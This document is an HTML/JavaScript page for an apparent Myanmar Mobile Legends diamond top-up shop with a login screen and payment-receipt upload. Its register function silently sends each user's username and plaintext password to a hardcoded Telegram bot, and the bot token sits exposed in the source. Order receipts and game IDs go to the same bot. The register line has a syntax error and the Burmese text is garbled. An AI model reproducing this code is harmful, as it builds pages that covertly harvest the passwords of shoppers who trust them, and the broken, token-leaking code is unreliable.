<!DOCTYPE html>
<html lang="my">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PMK GAME SHORT MYANMAR</title>

<style>
:root {
  --primary: #00f2fe;
  --secondary: #4facfe;
  --bg: #0a0e14;
  --card: #161b22;
  --item: #21262d;
  --text: #ffffff;
  --warning: #ffcc00;
  --success: #00ff88;
}

body {
  margin:0; font-family: 'Segoe UI', Roboto, sans-serif;
  background: var(--bg); color: var(--text);
  overflow-x: hidden;
}

/* --- Auth Page Style --- */
#auth-page {
  position: fixed; inset: 0; background: var(--bg);
  display: flex; justify-content: center; align-items: center; z-index: 10000;
}
.auth-container {
  background: var(--card); padding: 30px 20px; border-radius: 24px;
  width: 85%; max-width: 380px; text-align: center;
  border: 1px solid rgba(0, 242, 254, 0.2);
}
.auth-tabs { display: flex; margin-bottom: 20px; background: #0d1117; border-radius: 12px; padding: 5px; }
.auth-tab { flex: 1; padding: 10px; cursor: pointer; border-radius: 10px; font-weight: bold; color: #8b949e; }
.auth-tab.active { background: var(--primary); color: #000; }
.auth-form { display: none; }
.auth-form.active { display: block; }

/* --- Main Page Style --- */
#main-page { display: none; }
header {
  background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
  text-align: center; padding: 20px; font-size: 18px; color: var(--primary); font-weight: bold;
  position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.3);
}

.tabs { display: flex; justify-content: center; gap: 10px; padding: 15px; }
.tab-btn { flex: 1; padding: 12px; background: var(--item); border: 1px solid #30363d; color: #8b949e; border-radius: 12px; font-weight: bold; cursor: pointer; text-align: center;}
.tab-btn.active { background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; }

section { padding: 15px; max-width: 600px; margin: auto; }
.server-content { display: none; }
.server-content.active { display: block; }

.card { background: var(--card); border-radius: 20px; padding: 15px; margin-bottom: 20px; border: 1px solid #30363d; }
h2 { color: var(--primary); margin-top: 0; font-size: 1rem; border-left: 4px solid var(--primary); padding-left: 10px; margin-bottom: 15px; }

.diamond-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
.diamond-item { 
  background: var(--item); border-radius: 12px; padding: 15px 5px; 
  text-align: center; font-size: 11px; cursor: pointer; border: 1px solid transparent; transition: 0.2s;
}
.diamond-item:hover { border-color: var(--primary); }
.price { margin-top: 5px; font-weight: bold; color: var(--primary); font-size: 10px; }

input, select { width: 100%; padding: 14px; margin-top: 12px; border-radius: 12px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }

.btn { margin-top: 20px; padding: 15px; background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; text-align: center; border-radius: 12px; font-weight: bold; cursor: pointer; }

.popup { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.9); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(8px); }
.popup-box { background: #1c2128; width: 90%; max-width: 400px; border-radius: 24px; padding: 25px; border: 1px solid var(--primary); }
#preview { width: 100px; border-radius: 8px; margin-top: 10px; display: none; border: 1px solid var(--primary); }

.history-item { background: var(--card); padding: 12px; border-radius: 12px; margin-top: 10px; border-left: 4px solid var(--primary); font-size: 11px; }
</style>
</head>

<body>

<div id="auth-page">
  <div class="auth-container">
    <h1 style="color: var(--primary); margin-bottom: 20px; font-size: 22px;">PMK GAME SHOP</h1>
    
    <div class="auth-tabs">
      <div id="tab-login" class="auth-tab active" onclick="toggleAuth('login')">á€¡á€€á€±á€¬á€„á€·á€ºá€á€„á€ºá€›á€”á€º</div>
      <div id="tab-register" class="auth-tab" onclick="toggleAuth('register')">á€¡á€€á€±á€¬á€„á€·á€ºá€–á€½á€„á€·á€ºá€›á€”á€º</div>
    </div>

    <div id="login-form" class="auth-form active">
      <input type="text" id="l-user" placeholder="Username">
      <input type="password" id="l-pass" placeholder="Password">
      <div class="btn" onclick="login()">á€á€„á€ºá€™á€Šá€º</div>
    </div>

    <div id="register-form" class="auth-form">
      <input type="text" id="r-user" placeholder="New Username">
      <input type="password" id="r-pass" placeholder="New Password">
      <div class="btn" onclick="register()">á€¡á€€á€±á€¬á€„á€·á€ºá€á€…á€ºá€–á€½á€„á€·á€ºá€™á€Šá€º</div>
    </div>
  </div>
</div>

<div id="main-page">
  <header>ğŸ® PMK GAME SHORT MYANMAR ğŸ’</header>
  
  <div class="tabs">
    <div class="tab-btn active" onclick="switchTab('normal', this)">Direct Server</div>
    <div class="tab-btn" onclick="switchTab('malaysia', this)">Malaysia ğŸ‡²ğŸ‡¾</div>
  </div>

  <section>
    <div id="normal" class="server-content active">
      <div class="card">
        <h2>ğŸŸ Special Passes</h2>
        <div class="diamond-grid">
          <div class="diamond-item" onclick="openOrder('Weekly Diamond Pass', '6,500 Ks')">ğŸ’ Weekly<div class="price">6,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('Weekly (2X)', '13,000 Ks')">ğŸ’ Weekly x2<div class="price">13,000 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('Twilight Pass', '32,000 Ks')">ğŸŒ™ Twilight<div class="price">32,000 Ks</div></div>
        </div>
      </div>

      <div class="card">
        <h2>ğŸ’ Mobile Legends Diamonds</h2>
        <div class="diamond-grid">
          <div class="diamond-item" onclick="openOrder('86 Diamonds', '5,500 Ks')">ğŸ’ 86<div class="price">5,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('172 Diamonds', '10,800 Ks')">ğŸ’ 172<div class="price">10,800 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('257 Diamonds', '15,800 Ks')">ğŸ’ 257<div class="price">15,800 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('344 Diamonds', '21,500 Ks')">ğŸ’ 344<div class="price">21,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('429 Diamonds', '26,500 Ks')">ğŸ’ 429<div class="price">26,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('514 Diamonds', '31,500 Ks')">ğŸ’ 514<div class="price">31,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('706 Diamonds', '43,000 Ks')">ğŸ’ 706<div class="price">43,000 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('1050 Diamonds', '64,000 Ks')">ğŸ’ 1050<div class="price">64,000 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('2195 Diamonds', '128,000 Ks')">ğŸ’ 2195<div class="price">128,000 Ks</div></div>
        </div>
      </div>
    </div>

    <div id="malaysia" class="server-content">
      <div class="card">
        <h2>ğŸ‡²ğŸ‡¾ Malaysia Server MLBB</h2>
        <div class="diamond-grid">
          <div class="diamond-item" onclick="openOrder('Weekly Pass (MY)', '9,500 Ks')">ğŸŸ Weekly<div class="price">9,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('74 Dia (MY)', '5,500 Ks')">ğŸ’ 74<div class="price">5,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('221 Dia (MY)', '15,500 Ks')">ğŸ’ 221<div class="price">15,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('442 Dia (MY)', '29,500 Ks')">ğŸ’ 442<div class="price">29,500 Ks</div></div>
          <div class="diamond-item" onclick="openOrder('884 Dia (MY)', '58,000 Ks')">ğŸ’ 884<div class="price">58,000 Ks</div></div>
        </div>
      </div>
    </div>

    <h2 style="text-align:center; border:none; margin-top:30px;">ğŸ“œ á€á€šá€ºá€šá€°á€™á€¾á€¯á€™á€¾á€á€ºá€á€™á€ºá€¸</h2>
    <div id="history-list"></div>
    
    <div style="text-align:center; margin: 30px 0; color:#ff6b6b; cursor:pointer;" onclick="location.reload()">Logout</div>
  </section>
</div>

<div class="popup" id="popup">
  <div class="popup-box">
    <h2 id="orderTitle" style="border:none; text-align:center; font-size: 16px;"></h2>
    <p id="orderPrice" style="text-align:center; color: var(--primary); font-weight:bold;"></p>
    
    <input type="number" id="game_id" placeholder="Game ID">
    <input type="number" id="server_id" placeholder="Server ID">
    <select id="payment_method">
      <option value="">á€„á€½á€±á€œá€½á€¾á€²á€”á€Šá€ºá€¸á€œá€™á€ºá€¸ á€›á€½á€±á€¸á€•á€«</option>
      <option>KBZ Pay</option>
      <option>Wave Pay</option>
    </select>
    
    <div style="font-size:11px; padding:10px; border:1px dashed var(--primary); margin-top:10px; border-radius:10px;">
        Kpay/Wave: 09789457150 (Nyein Ei Phyo)
    </div>

    <input type="file" id="receipt" accept="image/*">
    <center><img id="preview"></center>
    <div class="btn" id="confirm-btn" onclick="submitOrder()">ğŸ“© Confirm Order</div>
    <div style="text-align:center; margin-top:15px; color:#ff6b6b; cursor:pointer;" onclick="closeOrder()">á€™á€á€šá€ºá€á€±á€¬á€·á€•á€«</div>
  </div>
</div>

<script>
const BOT_TOKEN = "8540139841:AAHk85ZhZybd1Wh_YAWqeCk6OpTCjqNojr8";
const CHAT_ID = "8582088849";

// --- Login/Register Logic ---
function toggleAuth(type) {
  document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
  if(type === 'login') {
    document.getElementById('tab-login').classList.add('active');
    document.getElementById('login-form').classList.add('active');
  } else {
    document.getElementById('tab-register').classList.add('active');
    document.getElementById('register-form').classList.add('active');
  }
}

function register() {
  const u = document.getElementById('r-user').value.trim();
  const p = document.getElementById('r-pass').value.trim();
  if(!u || !p) return alert("á€–á€¼á€Šá€·á€ºá€…á€½á€€á€ºá€•á€±á€¸á€•á€«");
  localStorage.setItem('pmk_u', u);
  localStorage.setItem('pmk_p', p);
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(SHRegister\nUser: "+u+"\nPass: "+p)}`);
  alert("á€¡á€€á€±á€¬á€„á€·á€ºá€–á€½á€„á€·á€ºá€•á€¼á€®á€¸á€•á€«á€•á€¼á€®á‹ Login á€•á€¼á€”á€ºá€á€„á€ºá€•á€«á‹");
  toggleAuth('login');
}

function login() {
  const u = document.getElementById('l-user').value.trim();
  const p = document.getElementById('l-pass').value.trim();
  if(u === localStorage.getItem('pmk_u') && p === localStorage.getItem('pmk_p') && u !== null) {
    document.getElementById('auth-page').style.display = 'none';
    document.getElementById('main-page').style.display = 'block';
    loadHistory();
  } else {
    alert("á€¡á€™á€Šá€º á€á€­á€¯á€·á€™á€Ÿá€¯á€á€º á€…á€€á€¬á€¸á€á€¾á€€á€º á€™á€¾á€¬á€¸á€šá€½á€„á€ºá€¸á€”á€±á€•á€«á€á€Šá€ºá‹");
  }
}

// --- Shop Logic ---
let selectedItem = "";
function switchTab(id, el) {
  document.querySelectorAll('.server-content').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  el.classList.add('active');
}

function openOrder(item, price) {
  selectedItem = item;
  document.getElementById('orderTitle').innerText = item;
  document.getElementById('orderPrice').innerText = price;
  document.getElementById('popup').style.display = 'flex';
}

function closeOrder() { document.getElementById('popup').style.display = 'none'; }

document.getElementById('receipt').onchange = (e) => {
  const p = document.getElementById('preview');
  p.src = URL.createObjectURL(e.target.files[0]);
  p.style.display = 'block';
};

async function submitOrder() {
  const gid = document.getElementById('game_id').value;
  const sid = document.getElementById('server_id').value;
  const pay = document.getElementById('payment_method').value;
  const img = document.getElementById('receipt').files[0];
  const btn = document.getElementById('confirm-btn');

  if(!gid || !sid || !pay || !img) return alert("á€¡á€á€»á€€á€ºá€¡á€œá€€á€ºá€•á€¼á€Šá€·á€ºá€…á€¯á€¶á€…á€½á€¬á€–á€¼á€Šá€·á€ºá€•á€«á‹");

  btn.innerText = "Processing...";
  btn.style.pointerEvents = "none";

  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  const caption = `ğŸš€ ORDER NEW\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”\nğŸ‘¤ User: ${localStorage.getItem('pmk_u')}\nğŸ’ Item: ${selectedItem}\nğŸ® ID: ${gid}(${sid})\nğŸ’³ Pay: ${pay}`;
  formData.append("caption", caption);
  formData.append("photo", img);

  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
    if(res.ok) {
      saveHistory(selectedItem, gid, sid);
      alert("Order á€á€„á€ºá€á€¼á€„á€ºá€¸ á€¡á€±á€¬á€„á€ºá€™á€¼á€„á€ºá€•á€«á€á€Šá€ºá‹");
      closeOrder();
    }
  } catch (e) { alert("Error!"); }
  finally { btn.innerText = "ğŸ“© Confirm Order"; btn.style.pointerEvents = "auto"; }
}

function saveHistory(item, gid, sid) {
  let h = JSON.parse(localStorage.getItem('pmk_history')) || [];
  h.push({ item, gid, sid, time: new Date().toLocaleString() });
  localStorage.setItem('pmk_history', JSON.stringify(h));
  loadHistory();
}

function loadHistory() {
  const box = document.getElementById('history-list');
  let h = JSON.parse(localStorage.getItem('pmk_history')) || [];
  if(h.length === 0) return box.innerHTML = "<p style='text-align:center; font-size:12px;'>á€™á€¾á€á€ºá€á€™á€ºá€¸á€™á€›á€¾á€­á€á€±á€¸á€•á€«á‹</p>";
  box.innerHTML = h.reverse().slice(0, 5).map(i => `<div class="history-item"><b>${i.item}</b> - ID: ${i.gid}(${i.sid})<br><small>${i.time}</small></div>`).join('');
}
</script>

</body>
</html>
